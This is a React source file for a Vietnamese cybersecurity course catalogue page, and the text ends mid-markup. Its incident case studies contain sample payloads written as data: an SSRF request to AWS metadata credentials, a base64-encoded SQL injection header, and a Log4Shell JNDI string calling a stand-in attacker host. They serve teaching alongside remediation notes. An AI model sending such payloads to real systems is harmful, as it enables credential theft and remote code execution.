import { useState, useEffect, useMemo, lazy, Suspense } from "react"
import { Link, useSearchParams } from "react-router-dom"
import {
  Search,
  CheckCircle2,
  Clock,
  Award,
  Layers,
  ChevronDown,
  ChevronUp,
  ArrowRight,
  Terminal,
  Check,
  AlertTriangle,
  RotateCcw,
  Play,
  BookOpen,
  FileText,
  Compass,
  ShieldCheck,
} from "lucide-react"
import { Badge, Button, CountUp } from "../../components/common"
import useLearningStore from "../../stores/useLearningStore"
import useNotificationStore from "../../stores/useNotificationStore"

const CourseSyllabusDrawer = lazy(() =>
  import("./components/CourseSyllabusDrawer").then((m) => ({ default: m.CourseSyllabusDrawer }))
)
const InteractiveLessonModal = lazy(() =>
  import("./components/InteractiveLessonModal").then((m) => ({ default: m.InteractiveLessonModal }))
)

const CATEGORY_DEFS = [
  { id: "all", label: "Tất cả Học phần" },
  { id: "web", label: "Web & OWASP" },
  { id: "defensive", label: "SOC & Mật mã" },
  { id: "network", label: "Pháp chứng Mạng" },
  { id: "cloud", label: "Cloud & Kubernetes" },
  { id: "reverse", label: "Nhị phân & Reverse" },
]

// Hồ sơ sự cố an ninh mạng thực tế (Real-World Incident Case Studies)
const REAL_WORLD_CASE_STUDIES = [
  {
    id: "cs-1",
    tag: "Cloud / SSRF",
    cve: "AWS-IMDS-SSRF",
    victim: "Sự cố rò rỉ dữ liệu Capital One (106 triệu hồ sơ)",
    attackVector: "Server-Side Request Forgery qua Reverse Proxy WAF",
    impact:
      "Truy vấn địa chỉ link-local 169.254.169.254 để trích xuất khóa IAM Role tạm thời và tải xuống dữ liệu từ hơn 700 S3 buckets.",
    rootCause:
      "Máy chủ proxy cho phép chuyển tiếp URL tùy ý từ đầu vào người dùng tới dịch vụ metadata nội bộ mà không yêu cầu session token.",
    remediation:
      "Bắt buộc nâng cấp lên AWS IMDSv2 (yêu cầu HTTP PUT để cấp token phiên) và giới hạn network hop-limit = 1.",
    logSnippet:
      "GET /proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/waf-role HTTP/1.1",
  },
  {
    id: "cs-2",
    tag: "SQLi / Zero-Day",
    cve: "CVE-2023-34362",
    victim: "Chiến dịch khai thác MOVEit Transfer Enterprise",
    attackVector: "SQL Injection thông qua HTTP Request Header trong REST API",
    impact:
      "Chiến dịch tống tiền Cl0p khai thác lỗ hổng chưa được vá để trích xuất dữ liệu của hơn 2.000 tổ chức tài chính và chính phủ.",
    rootCause:
      "Ứng dụng giải mã header X-siLock-SessionInfo và nối trực tiếp chuỗi vào truy vấn SQL thay vì sử dụng tham số hóa.",
    remediation:
      "Áp dụng Prepared Statements bắt buộc trên toàn bộ tầng truy xuất dữ liệu và vô hiệu hóa các endpoint khách không xác thực.",
    logSnippet:
      "Headers: X-siLock-SessionInfo: eyJ1c2VyIjoiYWRtaW4nIFVOSU9OIFNFTEVDVCBudWxsLC4uLiJ9",
  },
  {
    id: "cs-3",
    tag: "RCE / Supply Chain",
    cve: "CVE-2021-44228",
    victim: "Apache Log4j (Log4Shell Remote Code Execution)",
    attackVector: "JNDI Lookup Injection trong User-Agent & HTTP Telemetry",
    impact:
      "Thực thi mã từ xa (RCE) trên hàng triệu dịch vụ Java doanh nghiệp chỉ bằng một chuỗi nhật ký độc hại.",
    rootCause:
      "Thư viện ghi log mặc định phân giải biểu thức ${jndi:ldap://...} bên trong dữ liệu chưa được kiểm chứng.",
    remediation:
      "Nâng cấp Log4j 2.17.1+, thiết lập log4j2.formatMsgNoLookups=true và chặn lưu lượng egress LDAP/RMI tại tường lửa.",
    logSnippet: "User-Agent: ${jndi:ldap://adversary-c2.internal/Exploit.class}",
  },
]

export function Learning() {
  const {
    courses,
    completedLessons,
    enrolledCourses,
    getCourseProgress,
    openLessonModal,
    toggleLesson,
    launchLessonLab,
    userXp,
    fetchCoursesFromApi,
    fetchUserEnrollments,
  } = useLearningStore()

  useEffect(() => {
    fetchCoursesFromApi()
    fetchUserEnrollments()
  }, [fetchCoursesFromApi, fetchUserEnrollments])

  const [activeCategory, setActiveCategory] = useState("all")
  const [searchQuery, setSearchQuery] = useState("")
  const [selectedDifficulty, setSelectedDifficulty] = useState("all")
  const [expandedSyllabus, setExpandedSyllabus] = useState({ "mod-web201": true })
  const [activeCaseStudyIndex, setActiveCaseStudyIndex] = useState(0)

  // Daily Threat Drill state
  const [drillAnswer, setDrillAnswer] = useState(null)
  const [drillSubmitted, setDrillSubmitted] = useState(false)
  const [drawerCourse, setDrawerCourse] = useState(null)

  const [searchParams] = useSearchParams()
  useEffect(() => {
    const courseParam = searchParams.get("course")
    const lessonParam = searchParams.get("lesson")
    if (courseParam) {
      openLessonModal(courseParam, lessonParam)
    }
  }, [searchParams, openLessonModal])

  const categoriesWithCounts = useMemo(() => {
    return CATEGORY_DEFS.map((cat) => ({
      ...cat,
      count:
        cat.id === "all"
          ? courses.length
          : courses.filter((c) => c.category === cat.id).length,
    }))
  }, [courses])

  const totalLabsCount = useMemo(() => {
    const sum = courses.reduce((acc, c) => acc + (c.labsCount || 0), 0)
    return sum > 0 ? sum : 23
  }, [courses])

  const toggleSyllabus = (modId) => {
    setExpandedSyllabus((prev) => ({
      ...prev,
      [modId]: !prev[modId],
    }))
  }

  const filteredModules = courses.filter((mod) => {
    const matchesCategory = activeCategory === "all" || mod.category === activeCategory
    const matchesDifficulty =
      selectedDifficulty === "all" ||
      (mod.difficultyKey &&
        mod.difficultyKey.toLowerCase() === selectedDifficulty.toLowerCase()) ||
      mod.difficulty.toLowerCase() === selectedDifficulty.toLowerCase()

    const q = searchQuery.trim().toLowerCase()
    const matchesSearch =
      !q ||
      mod.title.toLowerCase().includes(q) ||
      mod.code.toLowerCase().includes(q) ||
      mod.description.toLowerCase().includes(q) ||
      (mod.cert || "").toLowerCase().includes(q) ||
      (mod.rfc || "").toLowerCase().includes(q)

    return matchesCategory && matchesDifficulty && matchesSearch
  })

  const handleDrillSubmit = (index) => {
    setDrillAnswer(index)
    setDrillSubmitted(true)
    if (index === 0) {
      useNotificationStore
        .getState()
        .success(
          "Chính xác! +150 XP Phân Tích Mối Đe Dọa",
          "Bạn đã nhận diện chính xác vector SSRF nhắm vào AWS Instance Metadata."
        )
    }
  }

  const handleDrillReset = () => {
    setDrillAnswer(null)
    setDrillSubmitted(false)
  }

  const currentCaseStudy = REAL_WORLD_CASE_STUDIES[activeCaseStudyIndex]

  return (
    <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-10 sm:py-12 space-y-10 animate-fade-in-up">
      {/* ====================================================================
          §01. SCHOLARLY CURRICULUM MONOGRAPH HEADER
         ==================================================================== */}
      <section className="rounded-2xl bg-white dark:bg-[#121722] border border-[#E5E2DC] dark:border-white/[0.08] p-6 sm:p-8 shadow-xs">
        <div className="flex flex-col lg:flex-row lg:items-center lg:justify-between gap-8">
          <div className="space-y-4 max-w-2xl">
            <div className="flex items-center gap-2.5 flex-wrap">
              <span className="font-mono-tech text-[11px] font-semibold px-2.5 py-1 rounded-md bg-[#F3F1EC] dark:bg-[#161C2A] text-[#475569] dark:text-[#94A3B8] border border-[#E5E2DC] dark:border-white/[0.08] uppercase tracking-[0.08em]">
                §01 // CHƯƠNG TRÌNH ĐÀO TẠO CHUYÊN KHẢO
              </span>
              <span className="font-mono-tech text-[11px] font-medium px-2.5 py-1 rounded-md bg-blue-50 dark:bg-blue-500/12 text-[#1D4ED8] dark:text-[#93C5FD] border border-blue-200 dark:border-blue-500/25">
                {courses.length} HỌC PHẦN CHUẨN HÓA
              </span>
              <span className="font-mono-tech text-[11px] text-[#64748B] dark:text-[#94A3B8] hidden sm:inline">
                MITRE ATT&amp;CK · NIST SP 800-181
              </span>
            </div>

            <h1 className="font-serif-editorial text-3xl sm:text-4xl lg:text-[2.65rem] font-medium tracking-[-0.02em] leading-[1.15] text-[#0F172A] dark:text-[#F1F5F9]">
              Giáo trình An ninh mạng Thực nghiệm &amp;{" "}
              <em className="italic font-normal text-[#1D4ED8] dark:text-[#38BDF8]">
                Giải phẫu Lỗ hổng
              </em>
            </h1>

            <p className="text-sm sm:text-[15px] text-[#475569] dark:text-[#94A3B8] leading-[1.7] font-sans">
              Mỗi học phần kết hợp lý thuyết hình thức (RFC, CWE, MITRE ATT&amp;CK), phòng mô phỏng cơ chế tương tác trên trình duyệt, đối chiếu bản vá mã nguồn và bảo vệ đồ án Capstone theo Rubric NIST NICE.
            </p>

            <div className="flex flex-wrap items-center gap-3 pt-1">
              <Link
                to="/learning-paths"
                className="inline-flex items-center gap-2 px-4 py-2 rounded-lg bg-[#F3F1EC] hover:bg-[#ECE9E2] dark:bg-[#161C2A] dark:hover:bg-[#1B2335] text-[#0F172A] dark:text-[#F1F5F9] border border-[#E5E2DC] dark:border-white/[0.08] font-sans font-semibold text-xs whitespace-nowrap transition-colors"
              >
                <Compass className="w-3.5 h-3.5 text-[#1D4ED8] dark:text-[#38BDF8]" />
                <span>Xem Lộ Trình Học Thuật</span>
              </Link>
              <Link
                to="/workbench"
                className="inline-flex items-center gap-2 px-4 py-2 rounded-lg bg-white hover:bg-[#FAF9F6] dark:bg-[#0B0E14] dark:hover:bg-[#161C2A] text-[#475569] dark:text-[#94A3B8] border border-[#E5E2DC] dark:border-white/[0.08] font-sans font-semibold text-xs whitespace-nowrap transition-colors"
              >
                <Terminal className="w-3.5 h-3.5 text-[#1D4ED8] dark:text-[#38BDF8]" />
                <span>Mở AI Research Workbench</span>
              </Link>
            </div>
          </div>

          {/* Academic Telemetry Ledger */}
          <div className="grid grid-cols-2 gap-3 p-4 rounded-xl bg-[#FAF9F6] dark:bg-[#0B0E14] border border-[#E5E2DC] dark:border-white/[0.08] shrink-0 min-w-[290px]">
            <div className="p-3 rounded-lg bg-white dark:bg-[#121722] border border-[#EFEDE7] dark:border-white/[0.06]">
              <span className="text-[10px] font-mono-tech font-medium text-[#64748B] dark:text-[#94A3B8] uppercase block">
                Nghiên Cứu Viên
              </span>
              <span className="text-lg font-mono-tech font-bold text-[#0F172A] dark:text-[#F1F5F9] mt-0.5 block">
                <CountUp end={14820} start={14820} duration={200} />
              </span>
            </div>
            <div className="p-3 rounded-lg bg-white dark:bg-[#121722] border border-[#EFEDE7] dark:border-white/[0.06]">
              <span className="text-[10px] font-mono-tech font-medium text-[#64748B] dark:text-[#94A3B8] uppercase block">
                Bài Lab Tích Hợp
              </span>
              <span className="text-lg font-mono-tech font-bold text-[#1D4ED8] dark:text-[#38BDF8] mt-0.5 block">
                <CountUp end={totalLabsCount} start={totalLabsCount} duration={200} suffix=" Labs" />
              </span>
            </div>
            <div className="p-3 rounded-lg bg-white dark:bg-[#121722] border border-[#EFEDE7] dark:border-white/[0.06]">
              <span className="text-[10px] font-mono-tech font-medium text-[#64748B] dark:text-[#94A3B8] uppercase block">
                Điểm Tích Lũy XP
              </span>
              <span className="text-lg font-mono-tech font-bold text-amber-700 dark:text-amber-300 mt-0.5 block">
                {userXp} XP
              </span>
            </div>
            <div className="p-3 rounded-lg bg-white dark:bg-[#121722] border border-[#EFEDE7] dark:border-white/[0.06]">
              <span className="text-[10px] font-mono-tech font-medium text-[#64748B] dark:text-[#94A3B8] uppercase block">
                Chuẩn Thẩm Định
              </span>
              <span className="text-sm font-mono-tech font-bold text-[#0F172A] dark:text-[#F1F5F9] mt-1 block">
                NIST · Bloom
              </span>
            </div>
          </div>
        </div>
      </section>

      {/* ====================================================================
          §02. DOMAIN FILTERS ON 1 CLEAN ROW + SEARCH & DIFFICULTY BAR
         ==================================================================== */}
      <div className="space-y-4">
        {/* Domain Filters: 1 clean row with whitespace-nowrap */}
        <div
          role="tablist"
          aria-label="Lọc học phần theo lĩnh vực"
          className="flex items-center flex-nowrap gap-2 overflow-x-auto pb-1 no-scrollbar"
        >
          {categoriesWithCounts.map((cat) => {
            const isActive = activeCategory === cat.id
            return (
              <button
                key={cat.id}
                type="button"
                role="tab"
                aria-selected={isActive}
                onClick={() => setActiveCategory(cat.id)}
                className={`px-3.5 py-2 rounded-lg text-xs font-medium whitespace-nowrap shrink-0 transition-colors cursor-pointer inline-flex items-center gap-2 border ${
                  isActive
                    ? "bg-[#1D4ED8] dark:bg-[#3B82F6] text-white border-[#1D4ED8] dark:border-[#3B82F6] font-semibold"
                    : "bg-white dark:bg-[#121722] hover:bg-[#F3F1EC] dark:hover:bg-[#161C2A] text-[#475569] dark:text-[#94A3B8] border-[#E5E2DC] dark:border-white/[0.08]"
                }`}
              >
                <span>{cat.label}</span>
                <span
                  className={`text-[10px] px-1.5 py-0.5 rounded font-mono-tech ${
                    isActive
                      ? "bg-white/20 text-white"
                      : "bg-[#F3F1EC] dark:bg-[#161C2A] text-[#64748B] dark:text-[#94A3B8]"
                  }`}
                >
                  {cat.count}
                </span>
              </button>
            )
          })}
        </div>

        {/* Search & Difficulty Filter Toolbar */}
        <div className="flex flex-col sm:flex-row gap-3 items-stretch sm:items-center justify-between">
          <div className="relative flex-1 max-w-md">
            <label htmlFor="learning-catalog-search" className="sr-only">
              Tìm kiếm học phần theo mã, CVE, RFC hoặc chứng chỉ
            </label>
            <Search className="absolute left-3.5 top-1/2 -translate-y-1/2 h-4 w-4 text-[#64748B] dark:text-[#94A3B8]" />
            <input
              id="learning-catalog-search"
              name="learningSearch"
              type="text"
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              placeholder="Tìm mã học phần (WEB-201), RFC, CVE hoặc chứng chỉ..."
              className="w-full pl-10 pr-4 py-2.5 rounded-lg text-xs sm:text-sm bg-white dark:bg-[#121722] border border-[#E5E2DC] dark:border-white/[0.09] text-[#0F172A] dark:text-[#F1F5F9] placeholder:text-[#64748B] dark:placeholder:text-[#64748B] focus:outline-none focus:border-[#1D4ED8] dark:focus:border-[#3B82F6] focus:ring-2 focus:ring-[#1D4ED8]/15 transition-colors"
            />
          </div>

          <div className="flex items-center gap-1.5 overflow-x-auto pb-0.5 shrink-0">
            <span className="text-[11px] text-[#64748B] dark:text-[#94A3B8] font-mono-tech uppercase hidden sm:inline mr-1">
              Cấp độ:
            </span>
            {[
              { id: "all", label: "Tất Cả" },
              { id: "novice", label: "Cơ Bản" },
              { id: "intermediate", label: "Trung Cấp" },
              { id: "specialist", label: "Chuyên Gia" },
            ].map(({ id, label }) => (
              <button
                key={id}
                type="button"
                onClick={() => setSelectedDifficulty(id)}
                className={`px-3 py-1.5 rounded-lg text-xs font-mono-tech font-medium whitespace-nowrap shrink-0 transition-colors cursor-pointer border ${
                  selectedDifficulty === id
                    ? "bg-[#0F172A] dark:bg-[#F1F5F9] text-white dark:text-[#0B0E14] border-[#0F172A] dark:border-[#F1F5F9] font-semibold"
                    : "bg-white dark:bg-[#121722] text-[#475569] dark:text-[#94A3B8] hover:bg-[#F3F1EC] dark:hover:bg-[#161C2A] border-[#E5E2DC] dark:border-white/[0.08]"
                }`}
              >
                {label}
              </button>
            ))}
          </div>
        </div>
      </div>

      {/* ====================================================================
          §02 & §03. MAIN CURRICULUM LISTING + ACADEMIC SIDEBAR
         ==================================================================== */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
        {/* LEFT COLUMN: MODULE CARDS + CASE STUDIES DOSSIER (8 COLS) */}
        <div className="lg:col-span-8 space-y-6">
          <div className="flex items-center justify-between gap-2 flex-wrap">
            <h2 className="text-xs font-semibold font-mono-tech uppercase tracking-wider text-[#475569] dark:text-[#94A3B8] flex items-center gap-2">
              <BookOpen className="w-4 h-4 text-[#1D4ED8] dark:text-[#38BDF8]" />
              <span>§02 // DANH MỤC HỌC PHẦN ({filteredModules.length} HỌC PHẦN)</span>
            </h2>
            <span className="text-[11px] text-[#1D4ED8] dark:text-[#38BDF8] font-mono-tech font-medium">
              Chọn bài học để mở không gian mô phỏng &amp; thực hành
            </span>
          </div>

          {filteredModules.length === 0 ? (
            <div className="p-12 text-center bg-white dark:bg-[#121722] rounded-xl border border-[#E5E2DC] dark:border-white/[0.08] space-y-3">
              <Search className="h-9 w-9 text-[#64748B] dark:text-[#94A3B8] mx-auto" />
              <p className="text-sm font-medium text-[#0F172A] dark:text-[#F1F5F9]">
                Không tìm thấy học phần phù hợp với tiêu chí lọc hiện tại.
              </p>
              <Button
                variant="outline"
                size="sm"
                onClick={() => {
                  setActiveCategory("all")
                  setSelectedDifficulty("all")
                  setSearchQuery("")
                }}
              >
                Đặt lại bộ lọc
              </Button>
            </div>
          ) : (
            filteredModules.map((mod) => {
              const isExpanded = !!expandedSyllabus[mod.id]
              const isEnrolled = enrolledCourses.includes(mod.id)
              const progress = getCourseProgress(mod.id)
              const completedList = completedLessons[mod.id] || []

              return (
                <article
                  key={mod.id}
                  className="p-5 sm:p-6 rounded-xl bg-white dark:bg-[#121722] border border-[#E5E2DC] dark:border-white/[0.08] hover:border-[#D0CCC3] dark:hover:border-white/[0.16] shadow-xs transition-colors relative overflow-hidden space-y-4"
                >
                  {isEnrolled && (
                    <div className="absolute top-0 left-0 right-0 h-0.5 bg-[#1D4ED8] dark:bg-[#3B82F6]" />
                  )}

                  {/* Header Metadata Row */}
                  <div className="flex flex-wrap items-center justify-between gap-2.5">
                    <div className="flex items-center gap-2 flex-wrap">
                      <span className="px-2.5 py-0.5 rounded font-mono-tech text-xs font-semibold bg-blue-50 dark:bg-blue-500/12 text-[#1D4ED8] dark:text-[#93C5FD] border border-blue-200 dark:border-blue-500/25">
                        {mod.code}
                      </span>

                      <Badge
                        variant={
                          mod.difficulty === "Cơ Bản" || mod.difficulty === "Novice"
                            ? "success"
                            : mod.difficulty === "Trung Cấp" || mod.difficulty === "Intermediate"
                            ? "primary"
                            : "warning"
                        }
                        size="sm"
                      >
                        {mod.difficulty}
                      </Badge>

                      <span className="text-[11px] font-mono-tech px-2 py-0.5 rounded bg-[#F3F1EC] dark:bg-[#161C2A] text-[#475569] dark:text-[#94A3B8] border border-[#E5E2DC] dark:border-white/[0.08]">
                        {mod.cert}
                      </span>

                      <span className="text-[11px] font-mono-tech px-2 py-0.5 rounded bg-amber-50 dark:bg-amber-500/12 text-amber-800 dark:text-amber-300 border border-amber-200 dark:border-amber-500/25 hidden sm:inline-block">
                        MITRE: {mod.mitre}
                      </span>

                      <span className="text-[11px] font-mono-tech px-2 py-0.5 rounded bg-rose-50 dark:bg-rose-500/12 text-rose-700 dark:text-rose-300 border border-rose-200 dark:border-rose-500/25">
                        CVSS {mod.cvssBase}
                      </span>
                    </div>

                    <div className="flex items-center gap-3 text-xs font-mono-tech text-[#475569] dark:text-[#94A3B8]">
                      <span className="flex items-center gap-1 text-[#1D4ED8] dark:text-[#38BDF8] font-semibold">
                        <Clock className="h-3.5 w-3.5" />
                        {mod.duration}
                      </span>
                      <span className="hidden sm:flex items-center gap-1">
                        <Layers className="h-3.5 w-3.5" />
                        {mod.lessonsCount} Bài giảng
                      </span>
                    </div>
                  </div>

                  {/* Title, Scholarly Standard & Description */}
                  <div className="space-y-2">
                    <h3
                      onClick={() => openLessonModal(mod.id)}
                      className="font-serif-editorial text-xl font-medium text-[#0F172A] dark:text-[#F1F5F9] hover:text-[#1D4ED8] dark:hover:text-[#38BDF8] transition-colors cursor-pointer leading-snug"
                    >
                      {mod.title}
                    </h3>
                    <p className="text-xs sm:text-sm text-[#475569] dark:text-[#94A3B8] leading-relaxed font-sans">
                      {mod.description}
                    </p>
                    {(mod.rfc || mod.bloomLevel) && (
                      <div className="flex flex-wrap items-center gap-2 pt-0.5 text-[11px] font-mono-tech text-[#64748B] dark:text-[#94A3B8]">
                        {mod.rfc && <span>Chuẩn tham chiếu: {mod.rfc}</span>}
                        {mod.rfc && mod.bloomLevel && <span aria-hidden="true">·</span>}
                        {mod.bloomLevel && <span>Bloom: {mod.bloomLevel}</span>}
                      </div>
                    )}
                  </div>

                  {/* Progress Bar */}
                  {isEnrolled && (
                    <div className="rounded-lg bg-[#FAF9F6] dark:bg-[#0B0E14] p-3.5 border border-[#E5E2DC] dark:border-white/[0.08] space-y-1.5">
                      <div className="flex justify-between items-center text-xs font-mono-tech font-medium">
                        <span className="text-[#475569] dark:text-[#94A3B8]">
                          TIẾN ĐỘ HOÀN THÀNH
                        </span>
                        <span className="text-[#1D4ED8] dark:text-[#38BDF8] font-semibold">
                          {progress}% ({completedList.length}/{mod.syllabus.length} bài)
                        </span>
                      </div>
                      <div className="w-full h-1.5 rounded-full bg-[#ECE9E2] dark:bg-[#1B2335] overflow-hidden">
                        <div
                          className="h-full bg-[#1D4ED8] dark:bg-[#3B82F6] rounded-full transition-all duration-300"
                          style={{ width: `${progress}%` }}
                        />
                      </div>
                    </div>
                  )}

                  {/* Action Bar */}
                  <div className="pt-3 flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3 border-t border-[#EFEDE7] dark:border-white/[0.06]">
                    <button
                      type="button"
                      onClick={() => toggleSyllabus(mod.id)}
                      className="inline-flex items-center gap-1.5 text-xs font-semibold text-[#1D4ED8] dark:text-[#38BDF8] hover:underline cursor-pointer self-start sm:self-auto font-mono-tech"
                    >
                      {isExpanded ? (
                        <>
                          <ChevronUp className="h-4 w-4" />
                          <span>Thu gọn đề cương</span>
                        </>
                      ) : (
                        <>
                          <ChevronDown className="h-4 w-4" />
                          <span>
                            Xem chi tiết {mod.lessonsCount} Bài học &amp; {mod.labsCount} Labs
                          </span>
                        </>
                      )}
                    </button>

                    <div className="flex items-center gap-2 flex-wrap">
                      <button
                        type="button"
                        onClick={() => setDrawerCourse(mod)}
                        className="px-3 py-1.5 rounded-lg bg-[#F3F1EC] hover:bg-[#ECE9E2] dark:bg-[#161C2A] dark:hover:bg-[#1B2335] text-[#0F172A] dark:text-[#F1F5F9] font-mono-tech text-xs font-medium transition-colors cursor-pointer border border-[#E5E2DC] dark:border-white/[0.08] whitespace-nowrap"
                      >
                        Đề cương &amp; Capstone
                      </button>

                      <button
                        type="button"
                        onClick={() => launchLessonLab(mod.labId)}
                        className="px-3 py-1.5 rounded-lg bg-white hover:bg-[#FAF9F6] dark:bg-[#0B0E14] dark:hover:bg-[#161C2A] text-[#1D4ED8] dark:text-[#38BDF8] font-mono-tech text-xs font-medium inline-flex items-center gap-1.5 transition-colors cursor-pointer border border-blue-200 dark:border-blue-500/30 whitespace-nowrap"
                      >
                        <Terminal className="h-3.5 w-3.5" />
                        <span>Sandbox Lab</span>
                      </button>

                      <button
                        type="button"
                        onClick={() => openLessonModal(mod.id)}
                        className="px-4 py-1.5 rounded-lg bg-[#1D4ED8] hover:bg-[#1E40AF] dark:bg-[#3B82F6] dark:hover:bg-[#2563EB] text-white font-semibold text-xs inline-flex items-center gap-1.5 transition-colors cursor-pointer whitespace-nowrap"
                      >
                        <Play className="h-3.5 w-3.5 fill-current" />
                        <span>
                          {progress === 100
                            ? "Ôn Tập Học Phần"
                            : progress > 0
                            ? "Tiếp Tục Bài Học"
                            : "Vào Học Ngay"}
                        </span>
                      </button>
                    </div>
                  </div>

                  {/* Expandable Syllabus Accordion */}
                  {isExpanded && (
                    <div className="pt-3 border-t border-[#EFEDE7] dark:border-white/[0.06] space-y-2">
                      <div className="flex items-center justify-between text-[11px] font-mono-tech text-[#64748B] dark:text-[#94A3B8] uppercase tracking-wider">
                        <span>DANH SÁCH BÀI GIẢNG &amp; MÔ PHỎNG</span>
                        <span className="text-[#1D4ED8] dark:text-[#38BDF8] font-medium">
                          Bấm để mở không gian học
                        </span>
                      </div>

                      <div className="space-y-1.5">
                        {mod.syllabus.map((lesson, idx) => {
                          const isLessonDone = completedList.includes(lesson.id)

                          return (
                            <div
                              key={lesson.id}
                              className={`p-3 rounded-lg flex items-center justify-between text-xs transition-colors border ${
                                isLessonDone
                                  ? "bg-emerald-50/70 dark:bg-emerald-950/20 border-emerald-200 dark:border-emerald-500/25"
                                  : "bg-[#FAF9F6] hover:bg-[#F3F1EC] dark:bg-[#0B0E14] dark:hover:bg-[#161C2A] border-[#E5E2DC] dark:border-white/[0.08]"
                              }`}
                            >
                              <div className="flex items-center gap-3 flex-1 min-w-0">
                                <button
                                  type="button"
                                  onClick={(e) => {
                                    e.stopPropagation()
                                    toggleLesson(mod.id, lesson.id)
                                  }}
                                  aria-label={
                                    isLessonDone
                                      ? `Đánh dấu chưa hoàn thành ${lesson.title}`
                                      : `Đánh dấu đã hoàn thành ${lesson.title}`
                                  }
                                  className={`w-4 h-4 rounded-full flex items-center justify-center shrink-0 transition-colors cursor-pointer ${
                                    isLessonDone
                                      ? "bg-emerald-600 text-white"
                                      : "border border-[#D0CCC3] dark:border-white/[0.2] text-transparent hover:border-[#1D4ED8] dark:hover:border-[#3B82F6] hover:text-[#1D4ED8] dark:hover:text-[#38BDF8]"
                                  }`}
                                  title={
                                    isLessonDone
                                      ? "Đánh dấu chưa học"
                                      : "Đánh dấu đã hoàn thành"
                                  }
                                >
                                  <CheckCircle2 className="h-3.5 w-3.5" />
                                </button>

                                <div
                                  onClick={() => openLessonModal(mod.id, lesson.id)}
                                  className="cursor-pointer flex-1 min-w-0"
                                >
                                  <div className="flex items-center gap-2 flex-wrap">
                                    <span className="font-mono-tech text-[10px] text-[#1D4ED8] dark:text-[#38BDF8] font-semibold shrink-0">
                                      Bài {String(idx + 1).padStart(2, "0")}
                                    </span>
                                    <span
                                      className={`font-medium truncate ${
                                        isLessonDone
                                          ? "line-through text-[#64748B] dark:text-[#94A3B8]"
                                          : "text-[#0F172A] dark:text-[#F1F5F9] hover:text-[#1D4ED8] dark:hover:text-[#38BDF8]"
                                      }`}
                                    >
                                      {lesson.title}
                                    </span>
                                  </div>
                                </div>
                              </div>

                              <div className="flex items-center gap-3 shrink-0 ml-3 font-mono-tech text-[11px] text-[#64748B] dark:text-[#94A3B8]">
                                {lesson.bloomLevel && (
                                  <span className="hidden md:inline text-[10px] px-1.5 py-0.5 rounded bg-white dark:bg-[#121722] border border-[#E5E2DC] dark:border-white/[0.08]">
                                    {lesson.bloomLevel}
                                  </span>
                                )}
                                <span>{lesson.duration}</span>
                                <button
                                  type="button"
                                  onClick={() => openLessonModal(mod.id, lesson.id)}
                                  aria-label={`Mở bài học ${lesson.title}`}
                                  className="p-1 rounded text-[#64748B] dark:text-[#94A3B8] hover:text-[#1D4ED8] dark:hover:text-[#38BDF8] transition-colors cursor-pointer"
                                  title="Mở bài học"
                                >
                                  <ArrowRight className="h-3.5 w-3.5" />
                                </button>
                              </div>
                            </div>
                          )
                        })}
                      </div>
                    </div>
                  )}
                </article>
              )
            })
          )}

          {/* ====================================================================
              §03. REAL-WORLD INCIDENT CASE STUDIES DOSSIER
             ==================================================================== */}
          <section className="p-6 rounded-xl bg-white dark:bg-[#121722] border border-[#E5E2DC] dark:border-white/[0.08] shadow-xs space-y-5">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-4 border-b border-[#EFEDE7] dark:border-white/[0.06]">
              <div className="flex items-center gap-3">
                <div className="p-2 rounded-lg bg-[#F3F1EC] dark:bg-[#161C2A] text-[#1D4ED8] dark:text-[#38BDF8] border border-[#E5E2DC] dark:border-white/[0.08]">
                  <FileText className="h-4 w-4" />
                </div>
                <div>
                  <span className="text-[10px] font-mono-tech font-semibold uppercase tracking-wider text-[#64748B] dark:text-[#94A3B8] block">
                    §03 // HỒ SƠ NGHIÊN CỨU TÌNH HUỐNG
                  </span>
                  <h3 className="font-serif-editorial text-lg font-medium text-[#0F172A] dark:text-[#F1F5F9]">
                    Hồ Sơ Sự Cố An Ninh Mạng Thực Tế (Case Studies)
                  </h3>
                </div>
              </div>

              {/* Case Study Selection Tabs */}
              <div className="flex items-center gap-1.5 overflow-x-auto pb-1 no-scrollbar">
                {REAL_WORLD_CASE_STUDIES.map((cs, idx) => (
                  <button
                    key={cs.id}
                    type="button"
                    onClick={() => setActiveCaseStudyIndex(idx)}
                    className={`px-3 py-1.5 rounded-lg text-xs font-mono-tech font-semibold transition-colors cursor-pointer whitespace-nowrap shrink-0 border ${
                      activeCaseStudyIndex === idx
                        ? "bg-[#1D4ED8] dark:bg-[#3B82F6] text-white border-[#1D4ED8] dark:border-[#3B82F6]"
                        : "bg-[#F3F1EC] dark:bg-[#161C2A] text-[#475569] dark:text-[#94A3B8] border-[#E5E2DC] dark:border-white/[0.08] hover:text-[#0F172A] dark:hover:text-[#F1F5F9]"
                    }`}
                  >
                    {cs.tag}
                  </button>
                ))}
              </div>
            </div>

            <div className="space-y-4">
              <div className="flex items-center justify-between flex-wrap gap-2">
                <div className="flex items-center gap-2.5 flex-wrap">
                  <span className="font-mono-tech text-xs font-semibold px-2.5 py-0.5 rounded bg-rose-50 dark:bg-rose-500/12 text-rose-700 dark:text-rose-300 border border-rose-200 dark:border-rose-500/25">
                    {currentCaseStudy.cve}
                  </span>
                  <span className="font-serif-editorial font-medium text-base text-[#0F172A] dark:text-[#F1F5F9]">
                    {currentCaseStudy.victim}
                  </span>
                </div>
                <span className="text-[11px] font-mono-tech text-[#64748B] dark:text-[#94A3B8]">
                  Phân tích nguyên nhân gốc rễ
                </span>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-3.5 text-xs">
                <div className="p-3.5 rounded-lg bg-[#FAF9F6] dark:bg-[#0B0E14] border border-[#E5E2DC] dark:border-white/[0.08] space-y-1.5">
                  <span className="text-[10px] font-mono-tech font-semibold text-rose-700 dark:text-rose-300 uppercase block">
                    Vector Tấn Công &amp; Tác Động
                  </span>
                  <p className="font-semibold text-[#0F172A] dark:text-[#F1F5F9]">
                    {currentCaseStudy.attackVector}
                  </p>
                  <p className="text-[#475569] dark:text-[#94A3B8] text-xs leading-relaxed">
                    {currentCaseStudy.impact}
                  </p>
                </div>

                <div className="p-3.5 rounded-lg bg-[#FAF9F6] dark:bg-[#0B0E14] border border-[#E5E2DC] dark:border-white/[0.08] space-y-1.5">
